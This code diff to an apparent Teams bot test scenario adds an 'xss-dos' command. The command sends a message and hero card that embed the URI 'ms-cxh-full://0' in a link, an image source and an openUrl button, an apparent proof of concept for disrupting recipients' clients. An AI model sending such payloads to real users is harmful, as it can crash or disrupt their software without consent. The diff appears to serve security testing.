@@ -1,5 +1,6 @@
 import {
   CardFactory,
+  MessageFactory,
   MessagingExtensionAttachment,
   TeamsInfo,
   ThumbnailCard,
@@ -89,6 +90,19 @@ export class DefaultBot implements ITeamsScenario {
       await ctx.sendActivity({
         attachments: [card],
       });
+    });
+
+    teamsBot.registerTextCommand(/^xss-dos/i, async (ctx) => {
+      const url = "ms-cxh-full://0";
+      const msg = MessageFactory.text(`<a href="${url}">xss-dos</a>`);
+      const card1 = CardFactory.heroCard(
+        "title",
+        `<a href="${url}">xss-dos</a><img src="${url}" width="64" height="64"/>`,
+        undefined,
+        [{ type: "openUrl", value: url, title: "OpenUrl" }]
+      );
+      msg.attachments = [card1];
+      await ctx.sendActivity(msg);
     });
 
     teamsBot.registerTextCommand(/^carousel/i, async (ctx) => {
